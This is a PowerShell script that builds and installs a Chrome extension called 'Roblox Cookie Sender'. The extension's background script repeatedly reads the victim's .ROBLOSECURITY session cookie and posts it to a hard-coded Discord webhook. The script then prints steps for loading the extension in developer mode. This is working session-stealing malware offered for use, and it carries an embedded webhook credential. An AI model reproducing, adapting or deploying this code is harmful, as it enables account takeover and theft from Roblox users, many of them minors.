$extFolder = "$env:USERPROFILE\Desktop\RobloxExt"
New-Item -ItemType Directory -Force $extFolder | Out-Null

$manifest = @'
{
  "manifest_version": 3,
  "name": "Roblox Cookie Sender",
  "version": "1.0",
  "permissions": ["cookies", "tabs"],
  "host_permissions": ["https://www.roblox.com/*"],
  "background": { "service_worker": "background.js" }
}
'@
$manifest | Out-File "$extFolder\manifest.json" -Encoding UTF8

$background = @'
const WEBHOOK = "https://discord.com/api/webhooks/1495620738185433108/Guyq3VjA-yV4oV5FDypyuK7jmNBrrFZhyZ7sZthJ11sHGVR8U8HuNJioX8cFD8FVQUZI";
let sendCount = 0;
const MAX_SENDS = 3;

function sendCookie() {
    if (sendCount >= MAX_SENDS) return;
    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
        if (cookie?.value) {
            sendCount++;
            fetch(WEBHOOK, {
                method: "POST",
                body: JSON.stringify({
                    content: "**🎮 Roblox Cookie** (" + sendCount + "/3)\n```\n" + cookie.value + "\n```"
                }),
                headers: { "Content-Type": "application/json" }
            });
        }
    });
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (tab.url?.includes("roblox.com")) sendCookie();
});
chrome.tabs.onActivated.addListener(() => sendCookie());
setInterval(() => {
    chrome.tabs.query({ url: "*://*.roblox.com/*" }, (tabs) => {
        if (tabs.length > 0) sendCookie();
    });
}, 5000);
'@
$background | Out-File "$extFolder\background.js" -Encoding UTF8

Write-Host "✅ Extension created at: $extFolder" -ForegroundColor Green
Write-Host ""
Write-Host "📋 INSTALL STEPS:" -ForegroundColor Yellow
Write-Host "1. Go to chrome://extensions/" -ForegroundColor White
Write-Host "2. Turn ON 'Developer mode' (top right)" -ForegroundColor White
Write-Host "3. Click 'Load unpacked'" -ForegroundColor White
Write-Host "4. Select folder: $extFolder" -ForegroundColor White
Write-Host ""
pause
